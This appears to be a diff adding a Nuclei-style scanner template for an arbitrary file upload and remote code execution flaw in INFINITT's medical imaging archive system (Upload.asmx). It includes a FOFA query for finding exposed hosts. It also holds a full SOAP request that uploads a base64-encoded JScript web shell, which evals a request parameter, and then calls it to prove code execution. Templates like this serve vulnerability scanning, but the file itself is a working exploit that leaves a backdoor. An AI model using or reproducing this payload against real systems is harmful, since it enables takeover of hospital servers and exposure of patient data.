@@ -1,0 +1,52 @@
+id: yinfeida-upload-File-upload
+
+info:
+  name: 英飞达医学影像存档与通信系统 Upload.asmx 接口任意文件上传及远程代码执行漏洞
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: "INFINITT" && (icon_hash="1474455751" || icon_hash="702238928")
+      该漏洞源于英飞达医学影像存档与通信系统中Upload.asmx接口未正确验证文件上传请求，攻击者可通过构造恶意请求上传任意文件。成功利用该漏洞可导致目标服务器执行任意代码，部署持久化后门，最终实现对Web服务器的完全控制。
+  reference:
+  - https://blog.csdn.net/m0_60571842/article/details/139704053
+  tags: 英飞达医学影像存档与通信系统
+
+http:
+- raw:
+  - |
+    POST /webservices/Upload.asmx HTTP/1.1
+    Host: {{Hostname}}
+    SOAPAction: "http://tempuri.org/UploadData"
+    Content-Type: text/xml; charset=utf-8
+
+    <?xml version="1.0" encoding="utf-8"?>
+    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body>
+    <UploadData xmlns="http://tempuri.org/">
+    <guid>1</guid>
+    <patientId>1</patientId>
+    <patientName>1</patientName>
+    <fileName>rce.asmx</fileName>
+    <fileSize>1000</fileSize>
+    <file>PCVAIFdlYlNlcnZpY2UgTGFuZ3VhZ2U9IkpTY3JpcHQiIENsYXNzPSJXZWJTZXJ2aWNlMSIgJT4KIAppbXBvcnQgU3lzdGVtO2ltcG9ydCBTeXN0ZW0uV2ViO2ltcG9ydCBTeXN0ZW0uSU87aW1wb3J0IFN5c3RlbS5XZWIuU2VydmljZXM7CmltcG9ydCBTeXN0ZW0uV2ViLlNjcmlwdC5TZXJ2aWNlczsKaW1wb3J0IFN5c3RlbS5XZWI7CmltcG9ydCBTeXN0ZW0uV2ViLlNlcnZpY2VzOwogCnB1YmxpYyBjbGFzcyBXZWJTZXJ2aWNlMSBleHRlbmRzIFdlYlNlcnZpY2UKewogCldlYk1ldGhvZEF0dHJpYnV0ZSBTY3JpcHRNZXRob2RBdHRyaWJ1dGUgZnVuY3Rpb24gQ21kc2hlbGwoUGFzcyA6IFN0cmluZykgOiBWb2lkCiAgICB7CiAgICAgICAgICAgIHZhciBjID0gSHR0cENvbnRleHQuQ3VycmVudDsKICAgICAgICAgICAgdmFyIFJlcXVlc3QgPSBjLlJlcXVlc3Q7CiAgICAgICAgICAgIHZhciBSZXNwb25zZSA9IGMuUmVzcG9uc2U7CiAgICAgICAgICAgIGV2YWwoUGFzcyk7CiAgICB9Cn0=</file>
+    </UploadData>
+    </soap:Body>
+    </soap:Envelope>
+
+  - |
+    GET /spool/1/rce.asmx/Cmdshell?Pass=Response.Write("Hello,World") HTTP/1.1
+    Host: {{Hostname}}
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'Hello,World'
+  - type: status
+    status:
+    - 200
+
+
+
+
+
